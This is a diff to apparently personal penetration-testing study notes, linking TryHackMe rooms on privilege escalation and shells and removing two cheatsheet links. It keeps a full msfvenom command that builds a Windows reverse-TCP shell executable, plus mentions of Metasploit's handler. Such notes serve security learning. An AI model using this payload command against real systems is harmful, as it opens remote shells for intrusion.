@@ -15,8 +15,6 @@ https://tryhackme.com/room/linprivesc
 https://tryhackme.com/room/introtoshells
 
 * If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
-* https://tryhackme.com/room/introtoshells (Windows)
-* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
 * `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 * staged reverse shell payloads and stageless
 * exploit/multi/handler
